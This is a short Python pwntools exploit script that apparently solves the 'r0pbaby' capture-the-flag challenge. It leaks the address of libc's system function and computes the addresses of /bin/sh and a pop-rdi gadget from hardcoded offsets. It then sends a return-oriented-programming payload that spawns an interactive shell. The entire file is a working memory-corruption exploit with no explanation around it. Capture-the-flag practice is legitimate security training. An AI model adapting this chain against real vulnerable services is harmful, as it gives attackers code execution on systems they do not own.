from pwn import *

p = process('./r0pbaby')
#context(arch='amd64',os='linux',endian='little',log_level='debug')

p.sendlineafter(': ','2')
p.sendlineafter('symbol: ','system')

p.recvuntil("Symbol system: ")
system = int(p.recv(18),16)


binsh = system + 0x1479c7 # offset = binsh - system

POP_RDI_RET =  system - 0x2428e # offset = system offset - gadgt offset

log.success("system : "+hex(system))
log.success("binsh : "+hex(binsh))
log.success("POP RDI RET : "+hex(POP_RDI_RET))

p.sendlineafter(': ','3')
p.sendlineafter('max 1024): ','32')

payload="A"*8
payload+=p64(POP_RDI_RET)
payload+=p64(binsh)
payload+=p64(system)

p.sendline(payload)

p.interactive()
